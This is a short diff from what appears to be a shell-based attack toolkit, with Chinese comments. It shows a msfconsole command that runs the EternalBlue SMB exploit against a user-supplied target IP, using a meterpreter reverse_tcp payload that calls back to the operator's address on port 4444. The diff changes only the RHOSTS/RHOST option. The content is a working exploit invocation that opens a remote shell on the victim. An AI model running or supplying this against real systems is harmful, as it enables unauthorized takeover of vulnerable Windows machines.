@@ -672,7 +672,7 @@ read -p "Please Your IP：" IPme;
 #设置LHOST 反弹地址（本机地址）反弹端口设置为4444
 msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;
 set payload windows/x64/meterpreter/reverse_tcp;
-set RHOSTS $IPAdd;set RPORT 445;
+set RHOST $IPAdd;set RPORT 445;
 set LHOST $IPme;set LPORT 4444;run"
 
 }
